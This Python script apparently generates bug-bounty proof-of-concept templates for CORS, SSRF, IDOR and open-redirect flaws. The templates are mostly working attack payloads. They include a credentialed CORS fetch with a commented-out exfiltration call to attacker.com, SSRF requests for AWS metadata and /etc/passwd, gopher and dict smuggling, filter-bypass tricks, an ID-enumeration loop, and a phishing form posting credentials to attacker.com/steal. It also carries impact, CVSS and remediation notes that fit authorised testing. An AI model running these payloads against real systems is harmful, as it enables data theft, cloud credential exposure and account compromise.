#!/usr/bin/env python3
"""
PoC Template Generator
Generates proof-of-concept templates for common vulnerability types
"""

import sys
from pathlib import Path
from datetime import datetime

class PoCGenerator:
    def __init__(self, target: str, vuln_type: str):
        self.target = target
        self.vuln_type = vuln_type

    def generate_cors_poc(self, url: str, reflected_origin: str = None) -> str:
        """Generate CORS misconfiguration PoC"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - {self.target}</title>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <p>Target: <code>{url}</code></p>
    <p>Status: <span id="status">Testing...</span></p>
    <pre id="result"></pre>

    <script>
        // CORS Exploitation PoC
        const targetUrl = '{url}';
        const resultDiv = document.getElementById('result');
        const statusSpan = document.getElementById('status');

        fetch(targetUrl, {{
            method: 'GET',
            credentials: 'include',  // Include cookies
            mode: 'cors'
        }})
        .then(response => {{
            statusSpan.textContent = 'Vulnerable!';
            statusSpan.style.color = 'red';
            return response.text();
        }})
        .then(data => {{
            resultDiv.textContent = 'Response received (length: ' + data.length + ' bytes)\\n';
            resultDiv.textContent += 'First 500 chars:\\n' + data.substring(0, 500);

            // In real attack, exfiltrate to attacker server
            console.log('Data stolen:', data);
            // fetch('https://attacker.com/log', {{
            //     method: 'POST',
            //     body: JSON.stringify({{data: data}})
            // }});
        }})
        .catch(error => {{
            statusSpan.textContent = 'Not vulnerable or blocked';
            statusSpan.style.color = 'green';
            resultDiv.textContent = 'Error: ' + error.message;
        }});
    </script>
</body>
</html>
"""

    def generate_ssrf_poc(self, url: str, param: str) -> str:
        """Generate SSRF PoC"""
        return f"""# SSRF Proof of Concept
# Target: {self.target}
# Vulnerable URL: {url}
# Parameter: {param}

## Test Cases

### 1. Internal Network Access
```bash
# Test AWS metadata
curl "{url}?{param}=http://169.254.169.254/latest/meta-data/"

# Test localhost
curl "{url}?{param}=http://localhost:80"
curl "{url}?{param}=http://127.0.0.1:80"

# Test internal IP ranges
curl "{url}?{param}=http://10.0.0.1"
curl "{url}?{param}=http://192.168.1.1"
```

### 2. DNS Rebinding
```bash
# Use DNS rebinding service
curl "{url}?{param}=http://7f000001.1time.169.254.169.254.1time.repeat.rebind.network/latest/meta-data/"
```

### 3. Protocol Smuggling
```bash
# File protocol
curl "{url}?{param}=file:///etc/passwd"

# Gopher protocol (if supported)
curl "{url}?{param}=gopher://127.0.0.1:6379/_SET%20test%20value"

# Dict protocol
curl "{url}?{param}=dict://127.0.0.1:6379/INFO"
```

### 4. Bypass Techniques
```bash
# Using @ symbol
curl "{url}?{param}=http://evil.com@169.254.169.254/latest/meta-data/"

# Using decimal IP
curl "{url}?{param}=http://2130706433/"  # 127.0.0.1 in decimal

# Using octal IP
curl "{url}?{param}=http://0177.0.0.1/"

# Using hex IP
curl "{url}?{param}=http://0x7f.0x0.0x0.0x1/"

# Using redirects
curl "{url}?{param}=http://attacker.com/redirect-to-metadata"
```

## Expected Responses

**Vulnerable:**
- Returns content from internal endpoints
- Returns AWS metadata
- Returns file contents
- Shows different error messages for valid vs invalid internal hosts

**Not Vulnerable:**
- Blocks internal IPs
- Returns same error for all invalid URLs
- Validates URL scheme
- Implements allow-list

## Impact

- Access to internal services (databases, admin panels, etc.)
- Cloud metadata exposure (AWS keys, instance info)
- Port scanning internal network
- Reading local files
- Potential RCE via protocol smuggling

## CVSS 4.0 Score
Base Score: 8.2 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Confidentiality Impact: High
- Integrity Impact: Low
- Availability Impact: None
"""

    def generate_idor_poc(self, url: str, id_param: str, known_ids: list) -> str:
        """Generate IDOR PoC"""
        return f"""# IDOR Proof of Concept
# Target: {self.target}
# Vulnerable Endpoint: {url}
# ID Parameter: {id_param}

## Test Methodology

### 1. Create Two Test Accounts
```
User A: test_user_a@example.com
User B: test_user_b@example.com
```

### 2. Identify User A's Resource ID
```bash
# Login as User A
curl -X POST https://{self.target}/login \\
  -d "email=test_user_a@example.com&password=TestPass123" \\
  -c cookies_a.txt

# Access User A's resource
curl -b cookies_a.txt https://{self.target}{url}
# Note the ID in response: {known_ids[0] if known_ids else 'USER_A_ID'}
```

### 3. Attempt Access as User B
```bash
# Login as User B
curl -X POST https://{self.target}/login \\
  -d "email=test_user_b@example.com&password=TestPass123" \\
  -c cookies_b.txt

# Try to access User A's resource using User B's session
curl -b cookies_b.txt https://{self.target}{url.replace('{id_param}', str(known_ids[0]) if known_ids else 'USER_A_ID')}
```

### 4. Sequential ID Enumeration
```bash
# Test sequential IDs
for id in {{{known_ids[0] if known_ids else '1000'}..{known_ids[-1] if known_ids else '1010'}}}; do
  echo "Testing ID: $id"
  curl -s -b cookies_b.txt https://{self.target}{url.replace('{id_param}', '$id')} | jq .
done
```

## Vulnerability Confirmation

**Vulnerable if:**
- User B can access User A's resource (Horizontal Privilege Escalation)
- Regular user can access admin resources (Vertical Privilege Escalation)
- Unauthenticated user can access protected resources
- Sequential IDs reveal other users' data

**Response Comparison:**
```json
// User A accessing their own resource
{{
  "id": {known_ids[0] if known_ids else 1234},
  "email": "test_user_a@example.com",
  "data": "Private information"
}}

// User B accessing User A's resource (VULNERABLE)
{{
  "id": {known_ids[0] if known_ids else 1234},
  "email": "test_user_a@example.com",  // <- Should not be accessible!
  "data": "Private information"        // <- Data leak!
}}
```

## Impact

- Horizontal Privilege Escalation: Users can access each other's data
- Vertical Privilege Escalation: Regular users can access admin functions
- Data Enumeration: Attacker can dump all user data via sequential IDs
- Privacy Violation: Personal information disclosure

## CVSS 4.0 Score
Base Score: 7.1-8.2 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (for horizontal) / None (for vertical)
- User Interaction: None
- Confidentiality Impact: High
- Integrity Impact: Low-High (depending on modification capability)
- Availability Impact: None

## Remediation

1. Implement proper authorization checks on every request
2. Use UUIDs instead of sequential IDs
3. Verify user owns the resource before returning data
4. Implement rate limiting on enumeration attempts
5. Log access attempts for monitoring
"""

    def generate_open_redirect_poc(self, url: str, param: str) -> str:
        """Generate Open Redirect PoC"""
        return f"""# Open Redirect Proof of Concept
# Target: {self.target}
# Vulnerable URL: {url}
# Parameter: {param}

## Test Cases

### 1. Basic Redirect
```bash
# Test redirect to external domain
curl -I "{url}?{param}=https://evil.com"

# Expected: 302/301 redirect to evil.com
```

### 2. Phishing Simulation
```html
<!-- Phishing page hosted at https://evil.com/phish.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>Session Expired - Please Re-login</h1>
  <form action="https://attacker.com/steal" method="POST">
    <input type="email" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button>Login to {self.target}</button>
  </form>
</body>
</html>
```

### 3. Bypass Techniques
```bash
# Protocol-relative URL
curl -I "{url}?{param}=//evil.com"

# URL encoding
curl -I "{url}?{param}=https%3A%2F%2Fevil.com"

# Using @ symbol
curl -I "{url}?{param}=https://{self.target}@evil.com"

# Using backslash (works in some parsers)
curl -I "{url}?{param}=https://{self.target}\\\\@evil.com"

# Using null byte (if vulnerable)
curl -I "{url}?{param}=https://{self.target}%00.evil.com"

# Using dots
curl -I "{url}?{param}=https://evil.com/..;/..;/"
```

## Attack Scenarios

### Scenario 1: OAuth Token Theft
```
1. Attacker sends victim: {url}?{param}=https://evil.com/oauth-callback
2. Victim logs in to {self.target}
3. OAuth flow completes
4. Redirect sends OAuth token to evil.com
5. Attacker steals OAuth token
```

### Scenario 2: Credential Phishing
```
1. Attacker crafts URL: {url}?{param}=https://evil.com/fake-login
2. evil.com looks exactly like {self.target}
3. Victim trusts URL because it starts with {self.target}
4. Victim enters credentials on fake page
5. Credentials stolen
```

## Impact

- Phishing attacks with trusted domain
- OAuth token theft
- Session hijacking
- Credential harvesting
- Reputation damage

## CVSS 4.0 Score
Base Score: 4.7 (Medium) - 6.5 (Medium) with OAuth theft
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required
- Confidentiality Impact: Low-High (depending on what's stolen)
- Integrity Impact: Low
- Availability Impact: None

## Remediation

1. Implement redirect allow-list
2. Show warning page before external redirect
3. Validate URL matches expected domain
4. Use indirect references (redirect IDs) instead of URLs
5. Remove redirect parameter if not essential
"""

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 poc_generator.py <target> <vuln_type>")
        print("\nVulnerability types:")
        print("  cors <url> [reflected_origin]")
        print("  ssrf <url> <param>")
        print("  idor <url> <id_param> [known_ids...]")
        print("  redirect <url> <param>")
        sys.exit(1)

    target = sys.argv[1]
    vuln_type = sys.argv[2]

    generator = PoCGenerator(target, vuln_type)

    output_dir = Path(f"hunt_targets/{target}/pocs")
    output_dir.mkdir(parents=True, exist_ok=True)

    poc_content = ""
    filename = ""

    if vuln_type == "cors" and len(sys.argv) >= 4:
        url = sys.argv[3]
        reflected_origin = sys.argv[4] if len(sys.argv) >= 5 else None
        poc_content = generator.generate_cors_poc(url, reflected_origin)
        filename = "cors_poc.html"
    elif vuln_type == "ssrf" and len(sys.argv) >= 5:
        url = sys.argv[3]
        param = sys.argv[4]
        poc_content = generator.generate_ssrf_poc(url, param)
        filename = "ssrf_poc.md"
    elif vuln_type == "idor" and len(sys.argv) >= 5:
        url = sys.argv[3]
        id_param = sys.argv[4]
        known_ids = [int(x) for x in sys.argv[5:]] if len(sys.argv) > 5 else []
        poc_content = generator.generate_idor_poc(url, id_param, known_ids)
        filename = "idor_poc.md"
    elif vuln_type == "redirect" and len(sys.argv) >= 5:
        url = sys.argv[3]
        param = sys.argv[4]
        poc_content = generator.generate_open_redirect_poc(url, param)
        filename = "redirect_poc.md"
    else:
        print(f"❌ Invalid arguments for {vuln_type}")
        sys.exit(1)

    output_file = output_dir / filename
    with open(output_file, 'w') as f:
        f.write(poc_content)

    print(f"✅ PoC generated: {output_file}")

if __name__ == "__main__":
    main()
